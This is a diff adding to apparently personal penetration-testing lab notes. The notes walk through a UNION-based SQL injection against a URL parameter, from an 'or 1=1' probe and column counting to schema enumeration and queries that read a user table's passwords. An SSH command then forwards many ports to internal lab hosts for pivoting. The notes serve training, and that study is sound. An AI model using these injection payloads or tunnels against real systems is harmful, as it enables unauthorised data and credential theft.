@@ -113,14 +113,39 @@ Post Method (text box):
 Get Method (URL):
 Step 1: Identify vulnerable field
 
-        .php?Selection=
+        .php?Selection=<option> or 1=1
 
+        You are looking for whichever option returns everything
 
+        2. Identify the number of columns and order (**MOST IMPORTANT STEP**):
 
+        .php?Selection=<option> Union SELECT 1,2,3,4 #
 
+        add # or -- tells the database to ignore everything after (like a comment)
 
+        All three show, but notice that the order is 1,3,2
 
+        3. Input golden statement
 
+        .php?Selection=<option> UNION SELECT table_schema,column_name,table_name FROM information_schema.columns #
+
+        .php?Selection=<option> Union select column,column,column from schema.table #
+
+        !!!See how the order of the golden statement changed to reflect step 2!!!
+
+        !!!YOU WILL NOT BUILD WITH DEFAULT DATABASES!!! information_schema,performance_schema, MySQL
+
+        Duplicate tab!
+
+        4. Craft queries with golden statement
+
+        .php?Selection=<option> UNION SELECT 1,name,size FROM session.Tires; #
+
+        .php?Selection=<option> UNION SELECT @@version,database(),3 FROM session.Tires; #
+
+        .php?Selection=<option> UNION SELECT tireid,size,cost FROM Session.Tires #
+
+        .php?Selection=<option> UNION SELECT @@version,pass,name FROM session.user #
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 ssh -S /tmp/jump jump -O forward -D9050 -L41100:192.168.28.100:80 -L41101:192.168.28.100:2222 -L41102:192.168.28.105:2222 -L41103:192.168.28.111:80 -L41104:192.168.28.111:2222
 -L 41105:192.168.28.111:8080 -L41106:192.168.28.120:4242 -L41107:192.168.150.245:3389 -L41108:192.168.150.253:80
